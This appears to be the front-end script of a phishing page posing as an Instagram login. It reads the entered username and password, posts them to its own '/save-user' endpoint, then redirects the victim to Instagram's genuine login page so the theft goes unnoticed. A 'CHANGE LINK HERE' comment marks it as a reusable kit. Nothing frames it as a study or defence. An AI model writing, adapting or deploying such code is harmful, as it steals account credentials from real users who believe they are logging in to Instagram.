const loginBtn = document.getElementById("loginBtn");

loginBtn.addEventListener("click", async function () {

    const username =
    document.getElementById("username").value;

    const password =
    document.getElementById("password").value;

    if(username === "" || password === ""){
        alert("Please fill all fields");
        return;
    }

    const response = await fetch("/save-user", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            username,
            password
        })

    });

    const data = await response.json();

    if(data.success){

        // 🔥 CLEAR INPUTS
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";

        // 🚀 REDIRECT (CHANGE LINK HERE)
        window.location.href = "https://www.instagram.com/accounts/login/?hl=en";

    } else {
        alert("Login Failed");
    }

});

document.getElementById("createBtn").addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/emailsignup/?next=&hl=en";
});